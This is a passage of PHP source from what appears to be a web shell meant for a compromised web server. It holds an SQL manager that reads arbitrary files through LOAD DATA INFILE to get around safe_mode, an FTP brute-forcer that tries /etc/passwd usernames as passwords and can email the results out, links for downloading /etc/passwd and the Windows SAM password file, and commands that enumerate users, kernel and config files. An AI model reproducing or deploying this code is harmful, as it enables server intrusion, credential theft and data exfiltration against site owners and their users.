       echo "&lt;a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"&gt;&lt;img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"&gt;&lt;/a&gt;&nbsp;";
       echo "&lt;/td&gt;";
       echo "&lt;/tr&gt;";
      }
      mysql_free_result($result);
      echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"left\"&gt;&lt;img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"&gt;&lt;select name=\"sql_act\"&gt;";
      echo "&lt;option value=\"\"&gt;With selected:&lt;/option&gt;";
      echo "&lt;option value=\"deleterow\"&gt;Delete&lt;/option&gt;";
      echo "&lt;/select&gt;&nbsp;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;&lt;/p&gt;";
     }
    }
    else {
     $result = mysql_query("SHOW TABLE STATUS", $sql_sock);
     if (!$result) {echo mysql_smarterror();}
     else
     {
      echo "&lt;br&gt;&lt;form method=\"POST\"&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Table&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Rows&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Type&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Created&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Modified&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
      $i = 0;
      $tsize = $trows = 0;
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       $tsize += $row["Data_length"];
       $trows += $row["Rows"];
       $size = view_size($row["Data_length"]);
       echo "&lt;tr&gt;";
       echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"&gt;&lt;/td&gt;";
       echo "&lt;td&gt;&nbsp;&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"&gt;&lt;b&gt;".$row["Name"]."&lt;/b&gt;&lt;/a&gt;&nbsp;&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Rows"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Type"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Create_time"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Update_time"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$size."&lt;/td&gt;";
       echo "&lt;td&gt;&nbsp;&lt;a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&nbsp;&lt;a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;/td&gt;";
       echo "&lt;/tr&gt;";
       $i++;
      }
      echo "&lt;tr bgcolor=\"000000\"&gt;";
      echo "&lt;td&gt;&lt;center&gt;&lt;b&gt;+&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;";
      echo "&lt;td&gt;&lt;center&gt;&lt;b&gt;".$i." table(s)&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;";
      echo "&lt;td&gt;&lt;b&gt;".$trows."&lt;/b&gt;&lt;/td&gt;";
      echo "&lt;td&gt;".$row[1]."&lt;/td&gt;";
      echo "&lt;td&gt;".$row[10]."&lt;/td&gt;";
      echo "&lt;td&gt;".$row[11]."&lt;/td&gt;";
      echo "&lt;td&gt;&lt;b&gt;".view_size($tsize)."&lt;/b&gt;&lt;/td&gt;";
      echo "&lt;td&gt;&lt;/td&gt;";
      echo "&lt;/tr&gt;";
      echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"right\"&gt;&lt;img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"&gt;&lt;select name=\"sql_act\"&gt;";
      echo "&lt;option value=\"\"&gt;With selected:&lt;/option&gt;";
      echo "&lt;option value=\"tbldrop\"&gt;Drop&lt;/option&gt;";
      echo "&lt;option value=\"tblempty\"&gt;Empty&lt;/option&gt;";
      echo "&lt;option value=\"tbldump\"&gt;Dump&lt;/option&gt;";
      echo "&lt;option value=\"tblcheck\"&gt;Check table&lt;/option&gt;";
      echo "&lt;option value=\"tbloptimize\"&gt;Optimize table&lt;/option&gt;";
      echo "&lt;option value=\"tblrepair\"&gt;Repair table&lt;/option&gt;";
      echo "&lt;option value=\"tblanalyze\"&gt;Analyze table&lt;/option&gt;";
      echo "&lt;/select&gt;&nbsp;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;&lt;/p&gt;";
      mysql_free_result($result);
     }
    }
   }
   }
  }
  else {
   $acts = array("","newdb","serverstatus","servervars","processes","getfile");
   if (in_array($sql_act,$acts)) {?&gt;&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new DB:&lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newdb"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;input type="text" name="sql_newdb" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;View File:&lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="getfile"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;input type="text" name="sql_getfile" size="30" value="&lt;?php echo htmlspecialchars($sql_getfile); ?&gt;"&gt;&nbsp;&lt;input type="submit" value="Get"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;?php }
   if (!empty($sql_act)) {
    echo "&lt;hr size=\"1\" noshade&gt;";
    if ($sql_act == "newdb") {
     echo "&lt;b&gt;";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!&lt;/b&gt;&lt;br&gt;";}
     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".&lt;br&gt;Reason:&lt;/b&gt; ".mysql_smarterror();}
    }
    if ($sql_act == "serverstatus") {
     $result = mysql_query("SHOW STATUS", $sql_sock);
     echo "&lt;center&gt;&lt;b&gt;Server-status variables:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;/tr&gt;";}
     echo "&lt;/table&gt;&lt;/center&gt;";
     mysql_free_result($result);
    }
    if ($sql_act == "servervars") {
     $result = mysql_query("SHOW VARIABLES", $sql_sock);
     echo "&lt;center&gt;&lt;b&gt;Server variables:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;/tr&gt;";}
     echo "&lt;/table&gt;";
     mysql_free_result($result);
    }
    if ($sql_act == "processes") {
     if (!empty($kill)) {
       $query = "KILL ".$kill.";";
       $result = mysql_query($query, $sql_sock);
       echo "&lt;b&gt;Process #".$kill." was killed.&lt;/b&gt;";
     }
     $result = mysql_query("SHOW PROCESSLIST", $sql_sock);
     echo "&lt;center&gt;&lt;b&gt;Processes:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;TABLE cellSpacing=0 cellPadding=2 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;ID&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;USER&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;HOST&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;DB&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;COMMAND&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;TIME&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;STATE&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;INFO&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;td&gt;".$row[2]."&lt;/td&gt;&lt;td&gt;".$row[3]."&lt;/td&gt;&lt;td&gt;".$row[4]."&lt;/td&gt;&lt;td&gt;".$row[5]."&lt;/td&gt;&lt;td&gt;".$row[6]."&lt;/td&gt;&lt;td&gt;".$row[7]."&lt;/td&gt;&lt;td&gt;&lt;a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"&gt;&lt;u&gt;Kill&lt;/u&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";}
     echo "&lt;/table&gt;";
     mysql_free_result($result);
    }
    if ($sql_act == "getfile")
    {
     $tmpdb = $sql_login."_tmpdb";
     $select = mysql_select_db($tmpdb);
     if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
     if ($select)
     {
      $created = FALSE;
      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
      mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
      $result = mysql_query("SELECT * FROM tmp_file;");
      if (!$result) {echo "&lt;b&gt;Error in reading file (permision denied)!&lt;/b&gt;";}
      else
      {
       for ($i=0;$i&lt;mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
       $f = "";
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
       if (empty($f)) {echo "&lt;b&gt;File \"".$sql_getfile."\" does not exists or empty!&lt;/b&gt;&lt;br&gt;";}
       else {echo "&lt;b&gt;File \"".$sql_getfile."\":&lt;/b&gt;&lt;br&gt;".nl2br(htmlspecialchars($f))."&lt;br&gt;";}
       mysql_free_result($result);
       mysql_query("DROP TABLE tmp_file;");
      }
     }
     mysql_drop_db($tmpdb);
    }
   }
  }
}
echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n";
if ($sql_sock) {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected &lt; 0)){$affected = 0;}
  echo "&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Affected rows : ".$affected."&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;";
}
echo "&lt;/table&gt;\n";
}
//End of SQL Manager
if ($act == "ftpquickbrute") {
echo "&lt;center&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=barheader colspan=2&gt;";
echo ".: Ftp Quick Brute :.&lt;/td&gt;&lt;/tr&gt;";
echo "&lt;tr&gt;&lt;td&gt;";
if ($win) { echo "Can't run on Windows!"; }
else {
  function exftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {
    if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array("/bin/FALSE","/sbin/nologin")));}
    else {$TRUE = TRUE;}
    if ($TRUE) {
      $sock = @ftp_connect($host,$port,$timeout);
      if (@ftp_login($sock,$login,$pass)) {
        echo "&lt;a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"&gt;&lt;b&gt;Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"&lt;/b&gt;&lt;/a&gt;.&lt;br&gt;";
        ob_flush();
        return TRUE;
      }
    }
  }
  if (!empty($submit)) {
    if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
    $fp = fopen("/etc/passwd","r");
    if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
    else {
      if ($fqb_logging) {
        if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");}
        else {$fqb_logfp = FALSE;}
        $fqb_log = "FTP Quick Brute (".$sh_name.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
        if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
      }
      ob_flush();
      $i = $success = 0;
      $ftpquick_st = getmicrotime();
      while(!feof($fp)) {
        $str = explode(":",fgets($fp,2048));
        if (exftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh)) {
          echo "&lt;b&gt;Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"&lt;/b&gt;&lt;br&gt;";
          $fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n";
          if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
          $success++;
          ob_flush();
        }
        if ($i &gt; $fqb_lenght) {break;}
        $i++;
      }
      if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!\r\n";}
      $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
      echo "&lt;hr size=\"1\" noshade&gt;&lt;b&gt;Done!&lt;/b&gt;&lt;br&gt;Total time (secs.): ".$ftpquick_t."&lt;br&gt;Total connections: ".$i."&lt;br&gt;Success.: &lt;font color=green&gt;&lt;b&gt;".$success."&lt;/b&gt;&lt;/font&gt;&lt;br&gt;Unsuccess.:".($i-$success)."&lt;/b&gt;&lt;br&gt;Connects per second: ".round($i/$ftpquick_t,2)."&lt;br&gt;";
      $fqb_log .= "\r\n------------------------------------------\r\nDone!\r\nTotal time (secs.): ".$ftpquick_t."\r\nTotal connections: ".$i."\r\nSuccess.: ".$success."\r\nUnsuccess.:".($i-$success)."\r\nConnects per second: ".round($i/$ftpquick_t,2)."\r\n";
      if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
      if ($fqb_logemail) {@mail($fqb_logemail,"".$sh_name." report",$fqb_log);}
      fclose($fqb_logfp);
    }
  }
  else {
    $logfile = $tmpdir_logs."exsh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
    $logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);
    echo "&lt;form action=\"".$surl."\"&gt;&lt;input type=hidden name=act value=\"ftpquickbrute\"&gt;".
         "Read first:&lt;/td&gt;&lt;td&gt;&lt;input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"&gt; Users only with shell&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked&gt;Logging&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Logging to file:&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Logging to e-mail:&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td colspan=2&gt;&lt;input type=submit name=submit value=\"Brute\"&gt;&lt;/form&gt;";
  }
  echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/center&gt;";
}
}
if ($act == "d") {
  if (!is_dir($d)) { echo "&lt;center&gt;&lt;b&gt;$d is a not a Directory!&lt;/b&gt;&lt;/center&gt;"; }
  else {
    echo "&lt;b&gt;Directory information:&lt;/b&gt;&lt;table border=0 cellspacing=1 cellpadding=2&gt;";
    if (!$win) {
      echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ";
      $ow = posix_getpwuid(fileowner($d));
      $gr = posix_getgrgid(filegroup($d));
      $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));
    }
    echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=\"".$surl."act=chmod&d=".urlencode($d)."\"&gt;&lt;b&gt;".view_perms_color($d)."&lt;/b&gt;&lt;/a&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Create time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filectime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Access time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",fileatime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MODIFY time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filemtime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
  }
}
if ($act == "phpinfo") {@ob_clean(); phpinfo(); exshexit();}
if ($act == "security") {
  echo "&lt;div class=barheader&gt;.: Server Security Information :.&lt;/div&gt;\n".
       "&lt;table&gt;\n".
       "&lt;tr&gt;&lt;td&gt;Open Base Dir&lt;/td&gt;&lt;td&gt;".$hopenbasedir."&lt;/td&gt;&lt;/tr&gt;\n";
  echo "&lt;td&gt;Password File&lt;/td&gt;&lt;td&gt;";
  if (!$win) {
    if ($nixpasswd) {
      if ($nixpasswd == 1) {$nixpasswd = 0;}
      echo "*nix /etc/passwd:&lt;br&gt;";
      if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
      if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}
      echo "&lt;form action=\"".$surl."\"&gt;&lt;input type=hidden name=act value=\"security\"&gt;&lt;input type=hidden name=\"nixpasswd\" value=\"1\"&gt;&lt;b&gt;From:&lt;/b&gt;&nbsp;&lt;input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\"&gt;&nbsp;&lt;b&gt;To:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\"&gt;&nbsp;&lt;input type=submit value=\"View\"&gt;&lt;/form&gt;&lt;br&gt;";
      $i = $nixpwd_s;
      while ($i &lt; $nixpwd_e) {
        $uid = posix_getpwuid($i);
        if ($uid) {
          $uid["dir"] = "&lt;a href=\"".$surl."act=ls&d=".urlencode($uid["dir"])."\"&gt;".$uid["dir"]."&lt;/a&gt;";
          echo join(":",$uid)."&lt;br&gt;";
        }
        $i++;
      }
    }
    else {echo "&lt;a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"&gt;&lt;b&gt;Download /etc/passwd&lt;/b&gt;&lt;/a&gt;";}
  }
  else {
    $v = $_SERVER["WINDIR"]."\repair\sam";
    if (!file_get_contents($v)) { echo "&lt;a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"&gt;&lt;b&gt;Download password file&lt;/b&gt;&lt;/a&gt;"; }
  }
  echo "&lt;/td&gt;&lt;/tr&gt;\n";
  echo "&lt;tr&gt;&lt;td&gt;Config Files&lt;/td&gt;&lt;td&gt;\n";
  if (!$win) {
    $v = array(
        array("User Domains","/etc/userdomains"),
        array("Cpanel Config","/var/cpanel/accounting.log"),
        array("Apache Config","/usr/local/apache/conf/httpd.conf"),
        array("Apache Config","/etc/httpd.conf"),
        array("Syslog Config","/etc/syslog.conf"),
        array("Message of The Day","/etc/motd"),
        array("Hosts","/etc/hosts")
    );
    $sep = "/";
  }
  else {
    $windir = $_SERVER["WINDIR"];
    $etcdir = $windir . "\system32\drivers\etc\\";
    $v = array(
        array("Hosts",$etcdir."hosts"),
        array("Local Network Map",$etcdir."networks"),
        array("LM Hosts",$etcdir."lmhosts.sam"),
    );
    $sep = "\\";
  }
  foreach ($v as $sec_arr) {
    $sec_f = substr(strrchr($sec_arr[1], $sep), 1);
    $sec_d = rtrim($sec_arr[1],$sec_f);
    $sec_full = $sec_d.$sec_f;
    $sec_d = rtrim($sec_d,$sep);
    if (file_get_contents($sec_full)) {
      echo " [ &lt;a href=\"".$surl."act=f&f=$sec_f&d=".urlencode($sec_d)."&ft=txt\"&gt;&lt;b&gt;".$sec_arr[0]."&lt;/b&gt;&lt;/a&gt; ] \n";
    }
  }
  echo "&lt;/td&gt;&lt;/tr&gt;";

  function displaysecinfo($name,$value) {
    if (!empty($value)) {
      echo "&lt;tr&gt;&lt;td&gt;".$name."&lt;/td&gt;&lt;td&gt;&lt;pre&gt;".wordwrap($value,100)."&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;\n";
    }
  }
  if (!$win) {
    displaysecinfo("OS Version",exexec("cat /proc/version"));
    displaysecinfo("Kernel Version",exexec("sysctl -a | grep version"));
    displaysecinfo("Distrib Name",exexec("cat /etc/issue.net"));
    displaysecinfo("Distrib Name (2)",exexec("cat /etc/*-realise"));
    displaysecinfo("CPU Info",exexec("cat /proc/cpuinfo"));
    displaysecinfo("RAM",exexec("free -m"));
    displaysecinfo("HDD Space",exexec("df -h"));
    displaysecinfo("List of Attributes",exexec("lsattr -a"));
    displaysecinfo("Mount Options",exexec("cat /etc/fstab"));
    displaysecinfo("lynx installed?",exexec("which lynx"));
    displaysecinfo("links installed?",exexec("which links"));
    displaysecinfo("GET installed?",exexec("which GET"));
    displaysecinfo("Where is Apache?",exexec("whereis apache"));
    displaysecinfo("Where is perl?",exexec("whereis perl"));
    displaysecinfo("Locate proftpd.conf",exexec("locate proftpd.conf"));
    displaysecinfo("Locate httpd.conf",exexec("locate httpd.conf"));
    displaysecinfo("Locate my.conf",exexec("locate my.conf"));
    displaysecinfo("Locate psybnc.conf",exexec("locate psybnc.conf"));
  }
  else {
    displaysecinfo("OS Version",exexec("ver"));
    displaysecinfo("Account Settings",exexec("net accounts"));
    displaysecinfo("User Accounts",exexec("net user"));
  }
  echo "&lt;/table&gt;\n";
}
if ($act == "mkfile") {
  if ($mkfile != $d) {
    if ($overwrite == 0) {
      if (file_exists($mkfile)) { echo "&lt;b&gt;FILE EXIST:&lt;/b&gt; $overwrite ".htmlspecialchars($mkfile); }
    }
    else {
      if (!fopen($mkfile,"w")) { echo "&lt;b&gt;ACCESS DENIED:&lt;/b&gt; ".htmlspecialchars($mkfile); }
      else { $act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile); }
    }
  }
  else { echo "&lt;div class=fxerrmsg&gt;Enter filename!&lt;/div&gt;\r\n"; }
}
if ($act == "encoder") {
echo "&lt;script language=\"javascript\"&gt;function set_encoder_input(text) {document.forms.encoder.input.value = text;}&lt;/script&gt;".
     "&lt;form name=\"encoder\" action=\"".$surl."\" method=POST&gt;".
     "&lt;input type=hidden name=act value=encoder&gt;".
     "&lt;center&gt;&lt;table class=contents&gt;".
     "&lt;tr&gt;&lt;td colspan=4 class=barheader&gt;.: Encoder :.&lt;/td&gt;".
     "&lt;tr&gt;&lt;td colspan=2&gt;Input:&lt;/td&gt;&lt;td&gt;&lt;textarea name=\"encoder_input\" id=\"input\" cols=70 rows=5&gt;".@htmlspecialchars($encoder_input)."&lt;/textarea&gt;&lt;br&gt;".
     "&lt;input type=submit value=\"calculate\"&gt;&lt;/td&gt;&lt;/tr&gt;".
     "&lt;tr&gt;&lt;td rowspan=4&gt;Hashes:&lt;/td&gt;";
foreach(array("md5","crypt","sha1","crc32") as $v) {
  echo "&lt;td&gt;".$v.":&lt;/td&gt;&lt;td&gt;&lt;input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;";
}
echo "&lt;/tr&gt;".
     "&lt;tr&gt;&lt;td rowspan=2&gt;Url:&lt;/td&gt;".
     "&lt;td&gt;urlencode:&lt;/td&gt;&lt;td&gt;&lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly&gt;&lt;/td&gt;&lt;/tr&gt;".
     "&lt;tr&gt;&lt;td&gt;urldecode:&lt;/td&gt;&lt;td&gt;&lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".htmlspecialchars(urldecode($encoder_input))."\" readonly&gt;&lt;/td&gt;&lt;/tr&gt;".
     "&lt;tr&gt;&lt;td rowspan=2&gt;Base64:&lt;/td&gt;".
     "&lt;td&gt;base64_encode:&lt;/td&gt;&lt;td&gt;&lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly&gt;&lt;/td&gt;&lt;/tr&gt;".
     "&lt;tr&gt;&lt;td&gt;base64_decode:&lt;/td&gt;&lt;td&gt;";
if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "&lt;input type=text size=35 value=\"Failed!\" disabled readonly&gt;";}
else {
  $debase64 = base64_decode($encoder_input);
  $debase64 = str_replace("&#92;&#48;","[0]",$debase64);
  $a = explode("\r\n",$debase64);
  $rows = count($a);
  $debase64 = htmlspecialchars($debase64);
  if ($rows == 1) { echo "&lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly&gt;"; }
  else { $rows++; echo "&lt;textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly&gt;".$debase64."&lt;/textarea&gt;"; }
  echo "&nbsp;&lt;a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"&gt;[Send to input]&lt;/a&gt;";
}
echo "&lt;/td&gt;&lt;/tr&gt;".
     "&lt;tr&gt;&lt;td&gt;Base convertations:&lt;/td&gt;&lt;td&gt;dec2hex&lt;/td&gt;&lt;td&gt;&lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"";
$c = strlen($encoder_input);
